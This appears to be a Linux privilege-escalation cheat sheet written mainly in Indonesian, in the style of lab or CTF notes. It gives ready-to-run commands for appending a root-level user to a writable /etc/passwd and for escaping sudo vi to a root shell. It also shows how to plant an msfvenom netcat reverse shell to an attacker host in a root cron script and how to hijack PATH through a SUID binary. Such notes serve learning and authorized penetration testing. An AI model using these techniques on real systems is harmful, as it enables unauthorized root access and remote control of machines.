# Enumeration

lakukan enumerating dengan menggunakan [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) dimana kita mengirimkan filenya ke target, dan menjalankannya di target untuk dapat mengetahui vuln yang ada di target dan dapat mengetahui privesc apa yang dapat dilakukan.

## Exploiting a writable /etc/passwd

```shell
test:x:0:0:root:/root:/bin/bash
```

[as divided by colon (:)]

1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. Group ID (GID): The primary group ID (stored in /etc/group file)
5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

sebelum menambah user ke `/etc/passwd` kita perlu membuat password beserta nama user yang di hash. Lakukan:

```shell
openssl passwd -1 -salt nama_user password
```

contoh:

```shell
openssl passwd -1 -salt new 123

> $1$new$p7ptkEKU1HnaHpRtzNizS1
```

selanjutnya tambahkan kedalam `/etc/passwd` sebagai root user baru

```
echo "new:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash" >> /etc/passwd
```

terakhir, kita dapat login dengan user "new" tersebut dengan

```shell
su new
password: 123
```

## Escaping Vi Editor

ketika kita masuk akun, kita dapat cek `sudo -l` untuk melihat list command sudo yang dapat dilakukan.

jika terdapat hasil seperti berikut

```shell
sudo -l
> ...
  User user8 may run the following commands on polobox:
      (root) NOPASSWD: /usr/bin/vi
```

maka kita dapat menggunakan teknik `escape vi`, dengan cara run vi editor dengan `sudo`. kita tidak akan diminta password karena dari hasil `sudo -l` kita tahu bahwa `NOPASSWD` untuk menjalankan vi dalam keadaan root. setelah masuk ke vi, kita dapat tuliskan berikut

```shell
...
:!/bin/sh
```

atau jika tidak masuk ke vi, kita dapat menggunakan

```shell
vi -c ':!/bin/sh' /dev/null

# atau

vi
:set shell=/bin/sh
:shell
```

## Exploiting Crontab

untuk exploit melalui crontab, kita dapat cek terlebih dahulu dengan

```shell
cat /etc/crontab
```

untuk melihat apakah ada proses yang akan dijalankan otomatis secara berkala. jika ada, dan dijalankan sebagai user `root` kita dapat menggunakannya sebagai privesc.

dalam hal ini contohnya terdapat file yang tiap 5 menit akan dijalankan secara otomatis oleh user `root`, yaitu file yang ada di `/home/user4/Desktop/autoscript.sh`. maka kita dapat menggunakannya untuk mendapatkan revshell. pertama kita siapkan command yang akan kita masukkan kedalam file `autoscript.sh` tersebut dengan caran men-generate

```shell
msfvenom -p cmd/unix/reverse_netcat lhost=LOCAL-IP lport=LOCAL-PORT

> ...
  mkfifo /tmp/llrnis; nc LOCAL-IP LOCAL-PORT 0</tmp/llrnis | /bin/sh >/tmp/llrnis 2>&1; rm /tmp/llrnis
```

selanjutnya kita dapat copy command tersebut dan memasukkannya kedalam `/home/user4/Desktop/autoscript.sh` dengan cara

```shell
echo "mkfifo /tmp/llrnis; nc LOCAL-IP LOCAL-PORT 0</tmp/llrnis | /bin/sh >/tmp/llrnis 2>&1; rm /tmp/llrnis" > autoscript.sh
```

lalu kita tinggal membuat listener menggunakan netcat dengan port yang telah kita buka sebelumnya

```shell
nc -lvnp LOCAL-PORT
```

terakhir kita hanya tinggal menuggu saja hingga nantinya file `autoscript.sh` dijalankan secara otomatis dan kita mendapat revshell.

## Exploiting Path Variable

PATH merupakan enviro variable di linux dan unix-like OS yang specified dir yang memegang executable program. ketika user run command apapun di terminal, maka akan dicari exec file dengan bantuan PATH. untuk dapat melihat PATH kita dapat menggunakan `echo $PATH`.

untuk dapat melakukan privesc dengan cara ini, kita memerlukan SUID binary yang ketika di run akan melakukan basic proses seperti `ps`. kita disini asumsikan tidak dapat provide argumen apapun untuk command injection. maka hal yang dapat kita lakukan adalah modify PATH variable ke lokasi sesuai pilihan kita, dalam hal ini adalah shell. namun ini bergantung pada siapa owner dari SUID file ini, jika owner adalah root, maka kita dapat menggunakannya untuk langsung dapat privesc ke shell.

caranya adalah, karena dalam hal ini `./script` ketika dijalankan akan melakukan perintah `ls`, maka dalam hal ini kita akan memodifikasi PATH, dengan cara

```shell
echo /bin/bash > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

setelah membuat `ls` baru, kita buat menjadi executable file, lalu kita mengubah PATH ke `/tmp`. selanjutnya kita hanya tinggal run `./script` untuk menjadi `root`.

namun belum selesai, karena kita mengganti `ls` asli, maka kita tidak akan bisa menggunakan command tersebut. maka kita perlu mengganti PATH nya lagi menjadi normal, dengan cara:

```shell
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
```

**INGAT!** ubah PATH menjadi normal **ketika sudah run** `./script`. karena jika tidak, maka ketika kita run `./script` akan tetap melakukan command `ls`.